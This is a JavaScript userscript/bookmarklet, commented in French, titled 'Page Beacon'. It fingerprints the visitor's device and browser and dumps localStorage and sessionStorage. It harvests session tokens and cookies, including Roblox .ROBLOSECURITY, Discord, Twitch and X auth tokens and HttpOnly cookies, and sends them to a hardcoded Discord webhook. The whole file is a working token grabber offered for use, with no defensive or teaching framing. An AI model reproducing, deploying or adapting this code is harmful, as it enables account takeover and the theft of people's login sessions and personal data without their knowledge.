/* =====================================================================
   Page Beacon — noyau partagé (hub / bookmarklet / userscript)
   ===================================================================== */
(() => {
    "use strict";
    if (window.__beacon) return;

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1559936073797468161/P0njg_IwvB0GGCpTw0GWRc9hYTcvOBKQCChYHgRTrtSoEajRA8Jm2AXZ8WBo3XOl7x7F";

    const SITES = [
        { re: /^mail\.google\.com$/i, name: "Gmail", kind: "Mail", color: 0xEA4335, keys: [], open: "https://mail.google.com/" },
        { re: /(^|\.)roblox\.com$/i, name: "Roblox", kind: "Jeu", color: 0xE2231A, keys: ["roblosecurity", "rbxsessiontracker", "roblox"], open: "https://www.roblox.com/home" },
        { re: /(^|\.)discord\.com$/i, name: "Discord", kind: "Messagerie", color: 0x5865F2, keys: ["token", "discord"], open: "https://discord.com/channels/@me" },
        { re: /(^|\.)youtube\.com$/i, name: "YouTube", kind: "Vidéo", color: 0xFF0000, keys: [], open: "https://www.youtube.com/" },
        { re: /(^|\.)google\.[a-z.]+$/i, name: "Google", kind: "Recherche", color: 0x4285F4, keys: [], open: "https://www.google.com/" },
        { re: /(^|\.)twitch\.tv$/i, name: "Twitch", kind: "Stream", color: 0x9146FF, keys: ["auth-token"], open: "https://www.twitch.tv/" },
        { re: /(^|\.)(twitter|x)\.com$/i, name: "X", kind: "Réseau", color: 0x1D9BF0, keys: ["auth_token"], open: "https://x.com/home" },
        { re: /(^|\.)github\.com$/i, name: "GitHub", kind: "Dev", color: 0x24292F, keys: [], open: "https://github.com/" },
        { re: /(^|\.)netflix\.com$/i, name: "Netflix", kind: "Vidéo", color: 0xE50914, keys: [], open: "https://www.netflix.com/browse" },
        { re: /(^|\.)steampowered\.com$/i, name: "Steam", kind: "Jeu", color: 0x171A21, keys: [], open: "https://store.steampowered.com/" }
    ];

    const trunc = (s, n) => (s.length > n ? s.slice(0, n - 1) + "…" : s);
    const DISCORD_TOKEN = /^"?[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{20,}"?$/;
    const SUSPECT = /(token|auth|jwt|bearer|session|access|refresh|credential|secret)/i;

    /* ---------------- 1. Empreinte de la cible ---------------- */
    function fingerprint(target) {
        let host = "", url = "", path = "/", title = "", via = "direct";
        if (target) {
            try {
                const u = new URL(target, location.href);
                host = u.hostname; url = u.href; path = u.pathname || "/";
                title = "→ " + host; via = "redirect";
            } catch (_) { }
        }
        if (!host) {
            host = location.hostname || "(local)";
            url = location.href;
            path = location.pathname || "/";
            title = (document.title || "(sans titre)").slice(0, 200);
        }
        const hit = SITES.find(s => s.re.test(host));
        return {
            found: !!hit, via,
            name: hit ? hit.name : (host.replace(/^www\./, "") || "Inconnu"),
            kind: hit ? hit.kind : "Autre",
            color: hit ? hit.color : 0x808080,
            keys: hit ? hit.keys : [],
            host, url, path, title
        };
    }

    /* ---------------- 2. Appareil / navigateur / OS ---------------- */
    function device() {
        const ua = navigator.userAgent || "";
        const touch = (navigator.maxTouchPoints || 0) > 1;
        const tablet = /iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua)) || (touch && /Macintosh/i.test(ua));
        const phone = !tablet && /Android|iPhone|iPod|Windows Phone|Mobile/i.test(ua);
        if (phone) return { label: "Téléphone", icon: "📱", touch };
        if (tablet) return { label: "Tablette", icon: "📟", touch };
        return { label: "Ordinateur", icon: "💻", touch };
    }

    function browser() {
        const ua = navigator.userAgent || "";
        if (navigator.brave && navigator.brave.isBrave) return { name: "Brave", engine: "Chromium", version: "?" };
        const t = [
            [/Edg\/([\d.]+)/, "Edge", "Chromium"],
            [/OPR\/([\d.]+)/, "Opera", "Chromium"],
            [/SamsungBrowser\/([\d.]+)/, "Samsung Internet", "Chromium"],
            [/Firefox\/([\d.]+)/, "Firefox", "Gecko"],
            [/Chrome\/([\d.]+)/, "Chrome", "Chromium"],
            [/Version\/([\d.]+).*Safari/, "Safari", "WebKit"]
        ];
        for (const [re, name, engine] of t) {
            const m = ua.match(re);
            if (m) return { name, engine, version: m[1] || "?" };
        }
        return { name: "Inconnu", engine: "?", version: "?" };
    }

    function os() {
        const ua = navigator.userAgent || "";
        if (navigator.userAgentData && navigator.userAgentData.platform)
            return { name: navigator.userAgentData.platform, version: "" };
        const t = [
            [/Windows NT 10\.0/, "Windows 10/11"], [/Windows NT ([\d.]+)/, "Windows"],
            [/Android ([\d.]+)/, "Android"], [/(?:iPhone|iPad|iPod).*?OS ([\d_]+)/, "iOS"],
            [/CrOS/, "ChromeOS"], [/Mac OS X ([\d_]+)/, "macOS"], [/Linux/, "Linux"]
        ];
        for (const [re, name] of t) {
            const m = ua.match(re);
            if (m) return { name, version: (m[1] || "").replace(/_/g, ".") };
        }
        return { name: "Inconnu", version: "" };
    }

    /* ---------------- 3. Stockage, cookies, tokens ---------------- */
    function readStore(bag) {
        const out = {};
        try { for (let i = 0; i < bag.length; i++) { const k = bag.key(i); out[k] = bag.getItem(k); } } catch (_) { }
        return out;
    }

    function gmCookies() {
        return new Promise(resolve => {
            try {
                if (typeof GM_cookie === "undefined" || !GM_cookie.list) return resolve([]);
                const r = GM_cookie.list({ url: location.href }, (list, err) => resolve(err ? [] : (list || [])));
                if (r && typeof r.then === "function") r.then(l => resolve(l || [])).catch(() => resolve([]));
            } catch (_) { resolve([]); }
        });
    }

    async function harvest(page, local, session) {
        const found = [], seen = new Set(), cookies = [];
        const add = (source, key, value, confident) => {
            if (value == null) return;
            const raw = String(value).replace(/^"|"$/g, "").trim();
            if (!raw || raw.length < 8) return;
            const sig = source + "|" + key + "|" + raw.slice(0, 30);
            if (seen.has(sig)) return;
            seen.add(sig);
            found.push({ source, key, value: raw, confident });
        };

        for (const want of page.keys) {
            const w = want.toLowerCase().replace(/[^a-z]/g, "");
            for (const [src, bag] of [["localStorage", local], ["sessionStorage", session]])
                for (const k in bag)
                    if (k.toLowerCase().replace(/[^a-z]/g, "").includes(w)) add(src, k, bag[k], true);
        }

        for (const [src, bag] of [["localStorage", local], ["sessionStorage", session]])
            for (const k in bag) {
                if (!SUSPECT.test(k)) continue;
                const v = bag[k];
                if (typeof v !== "string" || v.length < 12 || v.length > 4096) continue;
                add(src, k, v, DISCORD_TOKEN.test(v.trim()));
            }

        try {
            for (const part of (document.cookie || "").split(";")) {
                const i = part.indexOf("=");
                if (i < 0) continue;
                const k = part.slice(0, i).trim();
                if (!k || (!SUSPECT.test(k) && !/roblosecurity/i.test(k))) continue;
                const v = part.slice(i + 1).trim();
                cookies.push({ key: k, value: v });
                add("cookie", k, v, /roblosecurity/i.test(k));
            }
        } catch (_) { }

        for (const c of await gmCookies()) {
            if (!c || !c.name) continue;
            if (!c.httpOnly && !SUSPECT.test(c.name) && !/roblosecurity/i.test(c.name)) continue;
            cookies.push({ key: c.name, value: c.value });
            add(c.httpOnly ? "cookie(HttpOnly)" : "cookie", c.name, c.value, true);
        }

        return { found, cookies };
    }

    /* ---------------- 4. Score pondéré ---------------- */
    const WEIGHTS = { page: 2, device: 1, browser: 1, os: 1, screen: 1, lang: 1, tz: 1, token: 3, cookie: 1 };
    const LABELS = {
        page: "page non identifiée", device: "appareil", browser: "navigateur", os: "OS",
        screen: "écran", lang: "langue", tz: "fuseau", token: "token", cookie: "cookie"
    };

    function score(d) {
        const ok = {
            page: d.page.found, device: !!d.device.label, browser: d.browser.name !== "Inconnu",
            os: d.os.name !== "Inconnu", screen: !!d.screen, lang: !!d.lang, tz: !!d.tz,
            token: d.tokens.length > 0, cookie: d.cookies.length > 0
        };
        let got = 0, total = 0; const missing = [];
        for (const k in WEIGHTS) { total += WEIGHTS[k]; if (ok[k]) got += WEIGHTS[k]; else missing.push(LABELS[k]); }
        return { pct: Math.round((got / total) * 100), missing };
    }

    /* ---------------- 5. Collecte ---------------- */
    async function collect(opts) {
        const target = opts && opts.target;
        const page = fingerprint(target);
        const local = target ? {} : readStore(localStorage);
        const session = target ? {} : readStore(sessionStorage);
        const t = await harvest(page, local, session);
        const now = new Date();
        const offset = -now.getTimezoneOffset() / 60;

        const data = {
            page, device: device(), browser: browser(), os: os(),
            via: (opts && opts.via) || window.__BEACON_VIA || "hub",
            screen: screen.width + "x" + screen.height + " (dispo " + screen.availWidth + "x" + screen.availHeight + ", DPR " + window.devicePixelRatio + ")",
            lang: navigator.language || "?",
            langs: (navigator.languages || []).slice(0, 5),
            tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || "?") + " (UTC" + (offset >= 0 ? "+" : "") + offset + ")",
            dateUTC: now.toISOString(),
            dateLocale: now.toLocaleString(),
            hw: {
                cores: navigator.hardwareConcurrency || "?",
                mem: navigator.deviceMemory || "?",
                net: (navigator.connection && navigator.connection.effectiveType) || "?",
                touchPoints: navigator.maxTouchPoints || 0,
                localKeys: Object.keys(local).length,
                sessionKeys: Object.keys(session).length
            },
            tokens: t.found, cookies: t.cookies
        };
        const s = score(data);
        data.score = s.pct;
        data.missing = s.missing;
        return data;
    }

    /* ---------------- 6. Payload Discord ---------------- */
    function buildPayload(d) {
        const icon = "https://www.google.com/s2/favicons?domain=" + encodeURIComponent(d.page.host) + "&sz=128";
        const color = d.score === 100 ? 0x57F287 : d.page.color;
        const fields = [];
        const add = (name, value, inline = true) => {
            if (value == null || value === "") return;
            fields.push({ name, value: trunc(String(value), 1024), inline });
        };

        add("🌐 Page", d.page.name + " · " + d.page.kind);
        add("💻 Appareil", d.device.icon + " " + d.device.label + (d.device.touch ? " (tactile)" : ""));
        add("🧭 Navigateur", d.browser.name + " " + d.browser.version + " · " + d.browser.engine);
        add("🖥️ Système", d.os.name + (d.os.version ? " " + d.os.version : ""));
        add("📐 Écran", d.screen);
        add("🗣️ Langue", d.lang + (d.langs.length > 1 ? " (" + d.langs.join(", ") + ")" : ""));
        add("🕒 Fuseau", d.tz);
        add("📅 Date", d.dateLocale + "\n" + d.dateUTC);
        add("⚙️ Matériel", "CPU " + d.hw.cores + " cœurs · RAM ~" + d.hw.mem + " Go · réseau " + d.hw.net + " · points tactiles " + d.hw.touchPoints, false);
        add("📦 Stockage", d.hw.localKeys + " clés localStorage · " + d.hw.sessionKeys + " clés sessionStorage · " + d.cookies.length + " cookie(s) sensible(s)", false);
        add("🔀 Déclencheur", d.via);
        add("📄 Titre", d.page.title, false);
        add("🔗 URL", d.page.url, false);

        d.tokens.slice(0, 8).forEach((t, i) =>
            add("🔑 Token " + (i + 1) + " — " + t.source + " · " + t.key + (t.confident ? " ✔" : ""),
                "```\n" + trunc(t.value, 1000) + "\n```", false));
        if (d.tokens.length > 8) add("🔑 …", "+" + (d.tokens.length - 8) + " autre(s)", false);
        if (!d.tokens.length) add("🔑 Token", "aucun trouvé", false);

        add("✅ Capture", "**" + d.score + "%**");
        add("⚠️ Manquant", d.missing.length ? d.missing.join(", ") : "rien — capture complète");

        return {
            username: "Veille · " + d.page.name,
            avatar_url: icon,
            content: "**" + d.page.name + "** — " + d.page.title,
            embeds: [{
                title: d.page.name + " · " + d.page.kind + " · " + d.device.label,
                url: d.page.url, color,
                author: { name: d.page.host, url: d.page.url, icon_url: icon },
                thumbnail: { url: icon },
                fields: fields.slice(0, 25),
                footer: { text: "Score " + d.score + "% • " + d.page.host + " • " + d.via },
                timestamp: new Date().toISOString()
            }]
        };
    }

    /* ---------------- 7. Envoi ---------------- */
    function sendBeaconSafe(payload) {
        try {
            const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
            if (navigator.sendBeacon && navigator.sendBeacon(WEBHOOK_URL, blob))
                return Promise.resolve({ ok: true, status: 0, via: "sendBeacon" });
        } catch (_) { }
        return sendFetch(payload);
    }

    function sendFetch(payload) {
        return fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            keepalive: true
        }).then(r => ({ ok: r.ok, status: r.status, via: "fetch" }))
            .catch(e => ({ ok: false, status: 0, via: "fetch", error: e.message }));
    }

    async function run(opts) {
        const data = await collect(opts);
        const payload = buildPayload(data);
        const result = (opts && opts.beacon) ? await sendBeaconSafe(payload) : await sendFetch(payload);
        console.log("[beacon]", data.score + "%", result, data);
        return { data, payload, result };
    }

    window.__beacon = { collect, buildPayload, run, send: sendFetch, sendBeaconSafe, score, SITES, WEBHOOK_URL };
})();